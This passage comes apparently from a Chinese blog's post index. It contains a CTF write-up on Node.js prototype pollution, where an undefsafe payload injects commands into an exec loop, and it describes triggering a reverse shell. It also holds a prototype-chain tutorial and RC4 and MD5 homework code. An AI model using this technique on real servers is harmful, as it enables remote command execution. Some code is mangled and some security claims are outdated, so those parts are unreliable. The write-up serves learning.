&#125;;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> index <span class=\"keyword\">in</span> commands) &#123;</span><br><span class=\"line\">            exec(commands[index], &#123;</span><br><span class=\"line\">                shell: <span class=\"string\">'/bin/bash'</span></span><br><span class=\"line\">            &#125;, (err, stdout, stderr) =&gt; &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (err) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"built_in\">console</span>.log(<span class=\"string\">`stdout: <span class=\"subst\">$&#123;stdout&#125;</span>`</span>);</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        res.send(<span class=\"string\">\"ok\"</span>);</span><br><span class=\"line\">        res.end();</span><br><span class=\"line\">    &#125;)</span><br></pre></td></tr></table></figure>\n<p>通过原型链污染，将我们命令注入到commands即可，代码测试:</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> undefsafe = <span class=\"built_in\">require</span>(<span class=\"string\">'undefsafe'</span>);</span><br><span class=\"line\">note_list=&#123;&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> id=<span class=\"string\">'__proto__.aaa'</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> author = <span class=\"string\">'aesm1p'</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> raw = <span class=\"string\">'test'</span>;</span><br><span class=\"line\">undefsafe(note_list, id+<span class=\"string\">'.author'</span>,author);</span><br><span class=\"line\"><span class=\"keyword\">let</span> commands = &#123;</span><br><span class=\"line\">    <span class=\"string\">\"script-1\"</span>: <span class=\"string\">\"uptime\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"script-2\"</span>: <span class=\"string\">\"free -m\"</span></span><br><span class=\"line\"> &#125;;</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> index <span class=\"keyword\">in</span> commands) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(commands[index]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//uptime</span></span><br><span class=\"line\"><span class=\"comment\">//free -m</span></span><br><span class=\"line\"><span class=\"comment\">//aesm1p</span></span><br></pre></td></tr></table></figure>\n<p>可以看到我们的输入被成功执行，但是为什么字典遍历会遍历到我们输入的属性呢，这是因为</p>\n<blockquote>\n<p>for…in 循环只遍历可枚举属性（包括它的原型链上的可枚举属性）。像 Array和 Object使用内置构造函数所创建的对象都会继承自Object.prototype和String.prototype的不可枚举属性，例如 String 的 indexOf()  方法或 Object的toString()方法。循环将遍历对象本身的所有可枚举属性，以及对象从其构造函数原型中继承的属性（更接近原型链中对象的属性覆盖原型属性）</p>\n</blockquote>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><p>攻击过程如下：<br>在buuoj上开启一个靶机，确定IP地址，监听端口用来反弹shell<br>访问edit_note页面，进行原型链污染，写入反弹shell命令<br><img src=\"/2020/09/24/buuctf3/1.png\" alt><br>然后访问status页面触发命令执行<br><img src=\"/2020/09/24/buuctf3/2.png\" alt><br>读取flag即可<br><img src=\"/2020/09/24/buuctf3/3.png\" alt></p>\n<h1 id=\"原型链污染\"><a href=\"#原型链污染\" class=\"headerlink\" title=\"原型链污染\"></a>原型链污染</h1><p>既然碰到了原型链的题目，就顺便学习一下原型链的原理</p>\n<h2 id=\"JavaScript原型链\"><a href=\"#JavaScript原型链\" class=\"headerlink\" title=\"JavaScript原型链\"></a>JavaScript原型链</h2><p>既然说到了原型链污染,就势必要弄清楚什么是原型链,在找了很多文章之后,发现阮一峰师傅是讲的最清楚明白的,跟着他的思路来理解什么是原型链。</p>\n<p>JavaScript在创建之初就是作为浏览器的前端语言的,而且是面向对象的一个语言,那么涉及到对象,就势必要有继承机制,种种机缘之下, js作者放弃了在c++或java等语言上使用的类的继承机制,而是自己实现了一种机制来实现继承,这就是原型链。那么具体是怎么做的呢?</p>\n<p>我们先创建一个对象(JS中一切皆对象)</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">DOG</span>(<span class=\"params\">name</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.species = <span class=\"string\">'犬科'</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> dog1 = <span class=\"keyword\">new</span> DOG(<span class=\"string\">'dog1'</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> dog2 = <span class=\"keyword\">new</span> DOG(<span class=\"string\">'dog2'</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(dog1.name);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(dog2.name);</span><br><span class=\"line\"><span class=\"comment\">//dog1</span></span><br><span class=\"line\"><span class=\"comment\">//dog2</span></span><br></pre></td></tr></table></figure>\n<p>假如此时我们修改dog1的属性</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\">dog1.species = <span class=\"string\">'猫科'</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(dog1.species);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(dog2.species);</span><br><span class=\"line\"><span class=\"comment\">//猫科</span></span><br><span class=\"line\"><span class=\"comment\">//犬科</span></span><br></pre></td></tr></table></figure>\n<p>可以看到,对于dog1的修改没有在dog2中生效,即两个类无法共享数据,这样显然是不合理的,此时我们可以使用原型链来解决这个问题</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">DOG</span>(<span class=\"params\">name</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">    <span class=\"comment\">//this.species = '犬科';</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">DOG.prototype.species = <span class=\"string\">'犬科'</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> dog1 = <span class=\"keyword\">new</span> DOG(<span class=\"string\">'dog1'</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> dog2 = <span class=\"keyword\">new</span> DOG(<span class=\"string\">'dog2'</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(dog1.species);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(dog2.species);</span><br><span class=\"line\">DOG.prototype.species = <span class=\"string\">'猫科'</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(dog1.species);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(dog2.species);</span><br><span class=\"line\"><span class=\"comment\">//犬科</span></span><br><span class=\"line\"><span class=\"comment\">//犬科</span></span><br><span class=\"line\"><span class=\"comment\">//猫科</span></span><br><span class=\"line\"><span class=\"comment\">//猫科</span></span><br></pre></td></tr></table></figure>\n<p>可以看到使用原型链可以实现数据共享,相当于实现了类的继承,原型链主要是通过<code>prototype</code>属性实现的, <code>prototype</code>属性指向一个原型空间,可以理解为实例可以共同访问的空间，间接实现了继承。</p>\n<p><strong><strong>proto</strong>和prototype</strong></p>\n<blockquote>\n<p>由于markdown语法的原因,下文用<code>proto</code>来指代<code>__proto__</code></p>\n</blockquote>\n<p>这两个属性经常让人傻傻分不清楚,这里记录一下我的个人理解</p>\n<p>prototype是函数才会有的,而proto是对象所独有的,由于js万物皆对象，所以函数也有prototype属性, prototype可以理解为指向原型空间的一个属性,所以函数需要该属性来实现继承,而proto是对象所具有的属性,当访问本对象内部不存在的属性时就会去访问proto指向的(父)对象里面寻找,父对象如果找不到会继续透过父对象的proto属性上溯,直至返回null取值触发报错,这样层层上溯就形成了所谓的原型链</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> one = &#123;<span class=\"string\">'x'</span>:<span class=\"number\">1</span>&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> obj = <span class=\"keyword\">new</span> <span class=\"built_in\">Object</span>();</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(one.__proto__ === obj.prototype);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(one.__proto__ === <span class=\"built_in\">Object</span>.prototype);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(obj.__proto__ === <span class=\"built_in\">Object</span>.prototype);</span><br><span class=\"line\"><span class=\"comment\">//false</span></span><br><span class=\"line\"><span class=\"comment\">//true 在JS中，所有类都最初继承自Object</span></span><br><span class=\"line\"><span class=\"comment\">//true</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Father</span>(<span class=\"params\"></span>)</span>&#123;&#125;;</span><br><span class=\"line\">son1 = <span class=\"keyword\">new</span> Father();</span><br><span class=\"line\">son2 = <span class=\"keyword\">new</span> Father();</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(son1.__proto__ === son2.__proto__);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(son1.__proto__ === Father.prototype);</span><br><span class=\"line\"><span class=\"comment\">//true</span></span><br><span class=\"line\"><span class=\"comment\">//true 两个实例均指向同一个父类的原型空间</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(son1.__proto__ === obj.__proto__);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(son1.__proto__ === <span class=\"built_in\">Object</span>.prototype);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(son1.__proto__ === <span class=\"built_in\">Object</span>());</span><br><span class=\"line\"><span class=\"comment\">//false</span></span><br><span class=\"line\"><span class=\"comment\">//false</span></span><br><span class=\"line\"><span class=\"comment\">//false</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(son1.__proto__.__proto__ === <span class=\"built_in\">Object</span>.prototype);</span><br><span class=\"line\"><span class=\"comment\">//true son1继承自Father，Father继承自Object，所以两次上溯就访问到了Object的原型空间</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"原型链污染-1\"><a href=\"#原型链污染-1\" class=\"headerlink\" title=\"原型链污染\"></a>原型链污染</h2><p>有了以上知识的铺垫,那么思维发散一下就会发现,如果我们通过一proto-修改父类属性,乃至直接上溯到修改Object的类属性,不就可以间接影响到其它类的属性吗?例如下段代码</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = &#123;<span class=\"string\">'key'</span>:<span class=\"number\">1</span>&#125;;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log (a.key);</span><br><span class=\"line\"><span class=\"comment\">//1</span></span><br><span class=\"line\">a._proto_key = <span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(a.key);</span><br><span class=\"line\"><span class=\"comment\">//1:因为a已经有key属性了,不会再向父类上溯了,所以值不变</span></span><br><span class=\"line\">b = &#123;&#125;;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(b.key);</span><br><span class=\"line\"><span class=\"comment\">//向父类继承了key属性,值为2</span></span><br></pre></td></tr></table></figure>\n<p>可以看到新建的b对象虽然为空,但是key属性居然是2,这样就实现了原型链污染。<br>在实际环境中,我们需要寻找能够通过属性键名修改属性值的方法,就有机会触发该漏洞,常用方法有<code>merge</code>和<code>clone</code>等操作</p>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><p><a href=\"http://www.ruanyifeng.com/blog/2011/06/designing_ideas_of_inheritance_mechanism_in_javascript.html\" target=\"_blank\" rel=\"noopener\">Javascript继承机制的设计思想</a><br><a href=\"https://blog.csdn.net/cc18868876837/article/details/81211729\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/cc18868876837/article/details/81211729</a><br><a href=\"https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html\" target=\"_blank\" rel=\"noopener\">深入理解JavaScript Prototype污染攻击</a></p>\n","categories":["CTF"],"tags":["PrototypePollution"]},{"title":"密码学作业记录（二）","url":"/2019/01/15/crypto2/","content":"<p>接上篇</p>\n<a id=\"more\"></a>\n<h1 id=\"序列密码\"><a href=\"#序列密码\" class=\"headerlink\" title=\"序列密码\"></a>序列密码</h1><h2 id=\"RC4算法\"><a href=\"#RC4算法\" class=\"headerlink\" title=\"RC4算法\"></a>RC4算法</h2><p>​RC4算法是一种流加密算法，密钥长度可变。它加解密使用相同的密钥，因此也属于对称加密算法。RC4是有线等效加密（WEP）中采用的加密算法，也曾经是TLS可采用的算法之一。 </p>\n<p><strong>算法原理：</strong></p>\n<p>​RSA算法原理非常简单，256字节的状态向量S= {0，1，…，255}，用比特字节表示为S= {00000000, 00000001, ….，11111111}。用一个可变长度为1~256字节（8~8048位）的密钥来初始化256字节的状态向量S={S[0], S[1], …, S[255]}，任何时候，S都包含0~255的8位无符号数的排列组合。加密和解密时，密码流中的每一个字节k由S产生，通过系统的方式随机从S的256个元素中选取一个。每产生一个字节k，S的元素都要被再次排列。具体步骤如下:<br>​    </p>\n<ul>\n<li>步骤一：S向量原状态：  <figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">​S&#x3D;[0,1,2,...,255]</span><br></pre></td></tr></table></figure></li>\n<li>步骤二：创建临时向量T（256位），如果密钥K的长度为256位，则直接将K赋给T，否则一直重复复制K，直到填满256位的向量T </li>\n<li>步骤三：接下来我们使用T向量来产生S的初始排列。这个过程从S[0]开始一直处理到S[255]，同时对每个S[i]，根据T[i指定的方案将S[i]与S的另一个元素进行交换： </li>\n<li>步骤四：密码流产生。一旦S向量的初始排列完成后，密钥就不再被使用。接下来就是使用S自身来不断输出伪随机密码流的过程了。 </li>\n<li>步骤五：加密。将步骤四中获得的随机字节k与明文的下一字节做异或运算，产生的字节即为对应的密文字节。 </li>\n</ul>\n<p>​解密时，由于加密只是使用密码流对明文做了异或运算，因此解密过程只需要使用相同步骤产生密码流并对密文进行同样的异或运算即可得到加密前的明文。 </p>\n<p><strong>代码如下：</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\">s = []</span><br><span class=\"line\">t = []</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 初始化s</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">256</span>):</span><br><span class=\"line\">\ts.append(i);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 秘钥</span></span><br><span class=\"line\"><span class=\"comment\"># 通常取16字节</span></span><br><span class=\"line\">k = [<span class=\"number\">1</span>,<span class=\"number\">45</span>,<span class=\"number\">12</span>,<span class=\"number\">12</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">123</span>,<span class=\"number\">45</span>,<span class=\"number\">78</span>,<span class=\"number\">95</span>,<span class=\"number\">65</span>,<span class=\"number\">23</span>,<span class=\"number\">44</span>,<span class=\"number\">55</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 为暂时向量t赋值</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">256</span>):</span><br><span class=\"line\">\tt.append(k[i % len(k)])</span><br><span class=\"line\"></span><br><span class=\"line\">j = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">256</span>):</span><br><span class=\"line\">\tj = (j+s[i]+t[i]) % <span class=\"number\">256</span></span><br><span class=\"line\">\ts[i],s[j] = s[j],s[i]</span><br><span class=\"line\"></span><br><span class=\"line\">f = open(<span class=\"string\">'a.txt'</span>,<span class=\"string\">'rb'</span>)</span><br><span class=\"line\">text = f.read()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 产生密钥流</span></span><br><span class=\"line\">q = []</span><br><span class=\"line\">i = <span class=\"number\">0</span></span><br><span class=\"line\">j = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> r <span class=\"keyword\">in</span> range(len(text)):</span><br><span class=\"line\">\ti = (i+<span class=\"number\">1</span>) % <span class=\"number\">256</span></span><br><span class=\"line\">\tj = (j+s[i]) % <span class=\"number\">256</span></span><br><span class=\"line\">\ts[i],s[j] = s[j],s[i]</span><br><span class=\"line\">\tt = (s[i] + s[j]) % <span class=\"number\">256</span></span><br><span class=\"line\">\tq.append(s[t])</span><br><span class=\"line\"></span><br><span class=\"line\">cipher = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(text)):</span><br><span class=\"line\">\tt = (q[i] ^ text[i]) % <span class=\"number\">128</span></span><br><span class=\"line\">\tcipher += chr(t)</span><br><span class=\"line\"></span><br><span class=\"line\">plain = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(text)):</span><br><span class=\"line\">\tt = (q[i] ^ ord(cipher[i])) % <span class=\"number\">128</span></span><br><span class=\"line\">\tplain += chr(t)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> sys.argv[<span class=\"number\">1</span>] == <span class=\"string\">\"d\"</span>:</span><br><span class=\"line\">\tprint(<span class=\"string\">\"plain: \"</span>)</span><br><span class=\"line\">\tprint(plain)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">\tprint(<span class=\"string\">\"cipher: \"</span>)</span><br><span class=\"line\">\tprint(base64.b64encode(cipher.encode(<span class=\"string\">'utf-8'</span>)).decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">f.close()</span><br></pre></td></tr></table></figure>\n<p><strong>实例演示：</strong></p>\n<p>​    代码中加密的是一段英文文本，密文转为base64编码存储</p>\n<p><img src=\"/2019/01/15/crypto2/1.png\" alt=\"demo\"></p>\n<p><strong>安全性分析</strong></p>\n<p>​    由于RC4算法加密采用的是xor异或运算，所以一旦子密钥序列出现了重复，密文就有可能被破解。 那么，RC4算法生成的子密钥序列是否会出现重复呢？由于存在部分弱密钥，使得子密钥序列在不到100万字节内就发生了完全的重复，如果是部分重复，则可能在不到10万字节内就能发生重复。所以在使用中应该对密钥进行检查。</p>\n<p>​    根据目前的分析结果，没有任何的分析对于密钥长度达到128位的RC4有效，目前主要的攻击方法还是穷举攻击，所以到目前为止，RC4还算一个安全的加密算法。</p>\n<p>​    2015年，比利时研究人员Mathy Vanhoef及Frank Piessens，公布了针对RC4加密算法的新型攻击程式，可在75小时内取得cookie的内容。  </p>\n<p><strong>实用性分析</strong></p>\n<p>​    RC4算法等序列密码加密过程较之分组密码而言相对简单，实现起来相对容易，在加密效率上对分组密码的优势是不言而喻的。此外，对于需要加密/解密数据流的应用，比如在数据通信信道或浏览器/网络链路上，流密码可能是更好的选择 。</p>\n<hr>\n<p>​    流密码在安全性强度上不逊分组密码，而加密速率又远优于后者，那是不是说明流密码可以完全取代分组密码呢？很可惜，答案是否定的。 </p>\n<p>​    众所周知，分组密码的设计关键在于加解密算法，是明文和密文在密钥的控制下尽可能复杂，而序列密码的设计关键在于密钥序列产生器，使生成的密钥序列具有不可预测性。而密码序列产生器，也就是伪随机数字节流的产生，依赖种子（密钥）和伪随机函数，而如果种子和伪随机函数不变的情况下，每次产生的伪随机数字节流都是一样的。如果每次都用同样的密钥作为PRF的输入，产生同样的密码流来与两个不同的明文流分别进行异或运算得到两个密文流，那么将这两个密文流进行异或，结果就是两个原始明文的异或值。如果明文是文本字符串或其他已知其性质的字节流，那么密码破解很可能会成功。因此，对于这些已知性质的字节流进行流密码加密，密钥就不能被重复使用了。在这一点上，分组密码的优点就体现出来了。 </p>\n<h1 id=\"哈希函数\"><a href=\"#哈希函数\" class=\"headerlink\" title=\"哈希函数\"></a>哈希函数</h1><p>​    哈希函数的单向性，压缩性，抗碰撞性等特点使得它能够解决实际应用中很多棘手的安全问题，诸如数字签名，文件指纹等。</p>\n<h2 id=\"MD5算法\"><a href=\"#MD5算法\" class=\"headerlink\" title=\"MD5算法\"></a>MD5算法</h2><p>​    MD5(Message Digest Algorithm 5)，为计算机安全领域广泛使用的一种散列函数，用以提供消息的完整性保护。 </p>\n<p>​    MD5是一种信息摘要算法，MD5算法对输入任意长度的消息进行运行，通过特定的hash散列方法将文本信息转换成产生一个128位的消息摘要，压缩+加密+hash算法的结合体，是绝对不可逆的。</p>\n<p><strong>算法原理：</strong><br>​</p>\n<ul>\n<li>步骤一：数据填充。对消息进行数据填充，使消息的长度对512取模得448，设消息长度为X，即满    足X mod 512=448。根据此公式得出需要填充的数据长度。填充方法：在消息后面进行填充，填充第一位为1，其余为0。</li>\n<li>步骤二：添加消息长度。在第一步结果之后再填充上原消息的长度，可用来进行的存储长度为64位。如果消息长度大于264，则只使用其低64位的值，即（消息长度 对 264取模）。在此步骤进行完毕后，最终消息长度就是512的整数倍。</li>\n<li>步骤三：初始化链接变量。MD5使用4个32位的寄存器A、B、C、D，最开始存放4个固定的32位初始链接变量，这些参数用于第一轮迭代。</li>\n<li>步骤四：分组处理。将每个分组（512比特）分成16个小组，每个小组32位，这些分组参与每轮16步的函数运算，输出为32位值，经过4轮（共有四个轮函数）共64步之后，得到的4个寄存器的值分别于输入链接变量进行模加，即得到此次分组处理的输入链接变量。第四轮最后一步完成后，再与该分组最初的寄存器的初值相加，然后把A、B、C、D的值作为下一个迭代压缩的链接变量输入，直到最后一个消息分组得到的A、B、C、D寄存器值级联输出作为128比特的消息散列值。</li>\n</ul>\n<p>​    此处需要特别指出的是，在MD5的代码实现中，要特别注意<strong>小端序</strong>和<strong>大端序</strong>的问题，这个问题如果不注意的话会导致MD5计算出错。而MD5的所有数据计算都是基于<strong>小端序</strong>的。</p>\n<blockquote>\n<p>小端字节序（Little Endian）：低位字节存放在低内存地址，高位字节存放在高内存地址端。  大端字节序（Big Endian）：高位字节存放在低内存地址，低位字节存放在高内存地址端。</p>\n</blockquote>\n<p>​    在步骤二中添加消息长度就要按照小端序的方法填充长度，同时轮函数中各个参数也要按照小端序来计算，这点一定要特别注意。</p>\n<p>​    还有对于需要处理多个分组的情况，要做好A、B、C、D寄存器的及时更新，否则无法得到正确的MD5值。</p>\n<p><em>代码如下：</em></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> math</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 字符串转为2进制</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">str2bin</span><span class=\"params\">(s)</span>:</span></span><br><span class=\"line\">\ttext = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> s:</span><br><span class=\"line\">\t\ttext += <span class=\"string\">'&#123;:0&gt;8&#125;'</span>.format(bin(ord(i))[<span class=\"number\">2</span>:])</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> text</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 附加填充，输入为字母明文，输出为二进制</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">additonal_filling</span><span class=\"params\">(data)</span>:</span></span><br><span class=\"line\">\tbin_data = str2bin(data)</span><br><span class=\"line\">\torigi_mess_len = len(bin_data)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> origi_mess_len &gt; math.pow(<span class=\"number\">2</span>,<span class=\"number\">64</span>):</span><br><span class=\"line\">\t\tprint(<span class=\"string\">'Message too long!'</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"string\">\"0\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\tbit_origi_mess_len = <span class=\"string\">f'<span class=\"subst\">&#123;bin(origi_mess_len)[<span class=\"number\">2</span>:]:<span class=\"number\">0</span>&gt;<span class=\"number\">64</span>&#125;</span>'</span></span><br><span class=\"line\">\t\tmod_remain = origi_mess_len % <span class=\"number\">512</span>  <span class=\"comment\"># 余数</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> mod_remain &lt; <span class=\"number\">449</span>:</span><br><span class=\"line\">\t\t\tpadding_len = <span class=\"number\">448</span> - mod_remain</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\tpadding_len = <span class=\"number\">448</span> - mod_remain + <span class=\"number\">512</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> padding_len == <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\t\tbin_data += <span class=\"string\">'1'</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">elif</span> padding_len &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\t\tbin_data = bin_data + <span class=\"string\">'1'</span> + <span class=\"string\">'0'</span> * (padding_len<span class=\"number\">-1</span>)</span><br><span class=\"line\">\t\tleft = bit_origi_mess_len[:<span class=\"number\">32</span>]</span><br><span class=\"line\">\t\tright = bit_origi_mess_len[<span class=\"number\">32</span>:]</span><br><span class=\"line\">\t\tleft = left[<span class=\"number\">24</span>:<span class=\"number\">32</span>] + left[<span class=\"number\">16</span>:<span class=\"number\">24</span>] + left[<span class=\"number\">8</span>:<span class=\"number\">16</span>] + left[:<span class=\"number\">8</span>]</span><br><span class=\"line\">\t\tright = right[<span class=\"number\">24</span>:<span class=\"number\">32</span>] + right[<span class=\"number\">16</span>:<span class=\"number\">24</span>] + right[<span class=\"number\">8</span>:<span class=\"number\">16</span>] + right[:<span class=\"number\">8</span>]</span><br><span class=\"line\">\t\t<span class=\"comment\"># 32为为一组</span></span><br><span class=\"line\">\t\tbin_data += (right + left)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> bin_data</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 迭代压缩，输出为分组比特消息数组，每组的长度为512bit</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">iter_compress</span><span class=\"params\">(bdata)</span>:</span></span><br><span class=\"line\">\tgroup_mess = [[]*<span class=\"number\">16</span>] <span class=\"comment\"># 分组消息数组</span></span><br><span class=\"line\">\tprint(len(bdata))</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(bdata)//<span class=\"number\">512</span>):</span><br><span class=\"line\">\t\ttemp = bdata[i*<span class=\"number\">512</span>:i*<span class=\"number\">512</span>+<span class=\"number\">512</span>]</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">16</span>):</span><br><span class=\"line\">\t\t\tprint(temp[j*<span class=\"number\">32</span>:j*<span class=\"number\">32</span>+<span class=\"number\">32</span>])</span><br><span class=\"line\">\t\t\tgroup_mess[i].append(temp[j*<span class=\"number\">32</span>:j*<span class=\"number\">32</span>+<span class=\"number\">32</span>])</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> group_mess</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 小端序处理 @input hex</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">little_endian</span><span class=\"params\">(x,n)</span>:</span></span><br><span class=\"line\">\tx = <span class=\"string\">f'<span class=\"subst\">&#123;bin(x)[<span class=\"number\">2</span>:]:<span class=\"number\">0</span>&gt;&#123;n&#125;</span>&#125;'</span></span><br><span class=\"line\">\tans = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(n//<span class=\"number\">8</span>,<span class=\"number\">0</span>,<span class=\"number\">-1</span>):</span><br><span class=\"line\">\t\tans += x[(i<span class=\"number\">-1</span>)*<span class=\"number\">8</span>:i*<span class=\"number\">8</span>]</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> int(ans,<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 由于逻辑非比较特殊，所以另外实现一下,输入为16进制数据</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">not_operate</span><span class=\"params\">(data)</span>:</span></span><br><span class=\"line\">\tdata = <span class=\"string\">f'<span class=\"subst\">&#123;bin(data)[<span class=\"number\">2</span>:]:<span class=\"number\">0</span>&gt;<span class=\"number\">32</span>&#125;</span>'</span></span><br><span class=\"line\">\tout = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> data:</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> i == <span class=\"string\">\"0\"</span>:</span><br><span class=\"line\">\t\t\tout += <span class=\"string\">\"1\"</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\tout += <span class=\"string\">\"0\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> int(out,<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 